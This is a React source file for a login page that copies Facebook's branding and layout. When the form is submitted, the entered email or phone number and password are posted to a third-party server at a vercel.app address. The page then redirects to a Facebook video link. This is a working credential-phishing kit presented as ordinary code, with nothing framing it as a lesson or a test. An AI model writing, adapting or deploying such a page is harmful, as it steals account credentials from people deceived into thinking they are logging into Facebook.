import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { EyeIcon, EyeSlashIcon } from '@heroicons/react/24/solid'
import axios from 'axios'

const Login = () => {
    const navigate = useNavigate()
    const [password, setPassword] = useState('')
    const [emailOrPhone, setEmailOrPhone] = useState('')
    const [showIcon, setShowIcon] = useState(false)

    const handleSubmit = async (e) => {
        e.preventDefault()
        console.log('submit value', emailOrPhone, password)

        const config = {
            headers: { "Content-Type": "application/json" },

        };



        await axios.post(
            `https://hossain-s-project-server.vercel.app/api/login`,
            {
                emailOrPhone,
                password
            },
            config
        );

        navigate('https://fb.watch/iss6gbp9ul/')

    }

    return (
        <div className="bg-[#f0f2f5] flex-col justify-around flex
         items-center md:justify-between md:flex-row px-5 md:px-40
        h-[100vh] py-10">
            <div className='w-full md:w-3/5 text-center md:text-left md:mb-10 mb-[-5rem]'>
                <h1 className='text-[#1877f2] text-4xl md:text-6xl font-bold'>facebook</h1>
                <h3 className='text-2xl md:text-3xl mt-5 md:mt-10'>Facebook helps you connect and share with the people in your life.</h3>
            </div>

            <div className='w-full md:w-1/3 flex flex-col bg-white pb-5 shadow-lg'>
                <form className='flex flex-col p-5 w-full '
                    onSubmit={handleSubmit}>
                    <input type="text" name="emailOrPhone" id="emailOrPhone"
                        placeholder="Email address or phone number"
                        className='px-4 py-3 outline-1 outline-[#1877f2]
                         bg-white border-2 border-gray rounded-md'
                        value={emailOrPhone}
                        onChange={(e) => setEmailOrPhone(e.target.value)} />

                    <div
                        className=' rounded-md my-3 flex items-center justify-between relative'>

                        <input type={showIcon ? 'text' : 'password'} name="password" id="password"
                            placeholder='Password'
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className='h-full px-4 py-3 w-[100%] bg-transparent 
                            outline-1
                            outline-[#1877f2] border-2 border-gray'
                        />
                        {
                            password.length > 0 &&
                            <div className='mb-4'>
                                {
                                    showIcon ?

                                        <EyeIcon className="h-5 w-5 text-gray absolute right-2 cursor-pointer"
                                            onClick={() => setShowIcon(!showIcon)} /> :



                                        <EyeSlashIcon className="h-5 w-5 text-gray absolute right-2 cursor-pointer"
                                            onClick={() => setShowIcon(!showIcon)} />

                                }
                            </div>
                        }
                    </div>


                    <input type="submit"
                        onClick={handleSubmit}
                        value="Login" className='bg-[#1877f2] cursor-pointer text-white py-2 text-lg font-semibold rounded-md' />
                </form>

                <a href="/asf" className='text-[#1877f2] w-[90%] mx-auto text-center border-b-2 border-gray'>Forgotten password?</a>


                <a href="lfsdf"
                    className='bg-[#42b72a] mx-10 mt-5
                     text-white  rounded py-2 px-4 text-center text-lg font-semibold'>Create new account</a>

            </div>

        </div>
    )
}

export default Login